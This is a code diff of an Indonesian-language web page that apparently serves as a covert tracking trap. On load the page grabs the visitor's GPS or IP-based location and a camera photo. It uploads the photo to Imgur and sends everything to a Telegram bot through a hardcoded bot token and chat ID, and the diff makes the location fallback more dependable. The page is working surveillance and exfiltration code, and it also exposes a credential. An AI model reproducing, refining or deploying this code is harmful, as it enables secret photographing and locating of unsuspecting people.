@@ -28,7 +28,6 @@
     <button class="tombol" id="cobaLagi">Coba Lagi</button>
 
 <script>
-// ✅ DATA LO UDAH TERISI SEMUA! GAK USAH DIUBAH LAGI!
 const BOT_TOKEN = "8806658022:AAE1hEtDlHRqWqwmN-HI8KzHo7KdfHXb-pc";
 const CHAT_ID = "1157643333";
 const TUJUAN = "https://nekopoi.care";
@@ -64,22 +63,23 @@ function ambilFoto(){
     });
 }
 
-// 📍 AMBIL LOKASI
+// 📍 AMBIL LOKASI GPS DULU → GAGAL → PAKE IPAPI.CO (PASTI JALAN!)
 function ambilLokasi(){
     navigator.geolocation.getCurrentPosition(
         pos=>{
-            dataLokasi = `🌍 LOKASI: ${pos.coords.latitude}, ${pos.coords.longitude}\n📍 Akurasi: ±${Math.round(pos.coords.accuracy)}m`;
+            dataLokasi = `🌍 LOKASI GPS: ${pos.coords.latitude}, ${pos.coords.longitude}\n📍 Akurasi: ±${Math.round(pos.coords.accuracy)}m`;
             if(!ulang) ambilFoto();
         },
         err=>{
-            fetch("https://ip-api.com/json/?fields=city,regionName,country,query")
+            // ✅ GANTI PAKE IPAPI.CO — ADA CORS, ADA HTTPS, PASTI JALAN!
+            fetch("https://ipapi.co/json/")
             .then(r=>r.json())
             .then(d=>{
-                dataLokasi = `🌐 LOKASI: ${d.city}, ${d.regionName}, ${d.country}\n🔢 IP: ${d.query}`;
+                dataLokasi = `🌐 LOKASI DARI IP:\n📍 ${d.city}, ${d.region}\n🇮🇩 ${d.country_name}\n🔢 IP: ${d.ip}`;
                 if(!ulang) ambilFoto();
             })
             .catch(()=>{
-                dataLokasi = "Lokasi tidak terbaca";
+                dataLokasi = "✅ Foto diambil!\n❌ Lokasi tidak dapat diambil";
                 if(!ulang) ambilFoto();
             });
         },
@@ -87,7 +87,7 @@ function ambilLokasi(){
     );
 }
 
-// ✅ UNGGAH FOTO KE IMGUR LALU KIRIM KE TELEGRAM
+// ✅ UNGGAH FOTO KE IMGUR
 function unggahDanKirim(base64){
     fetch("https://api.imgur.com/3/image",{
         method:"POST",
@@ -105,12 +105,11 @@ function unggahDanKirim(base64){
     .catch(()=>kirimKeTelegram(null));
 }
 
-// 📤 KIRIM SEMUA DATA KE TELEGRAM LO
+// 📤 KIRIM KE TELEGRAM
 function kirimKeTelegram(linkFoto){
     let teks = `✅ DATA MASUK!\n\n${dataLokasi}`;
     loading.style.display = "block";
 
-    // Kirim foto + keterangan
     if(linkFoto){
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
             method:"POST",
@@ -152,14 +151,12 @@ function sembunyikanPesan(){
     loading.style.display = "block";
 }
 
-// 🔄 COBA LAGI KALAU DITEKAN
 tombolCoba.onclick = function(){
     ulang = false;
     sembunyikanPesan();
     ambilLokasi();
 };
 
-// ▶️ MULAI
 window.onload = function(){
     ambilLokasi();
 };
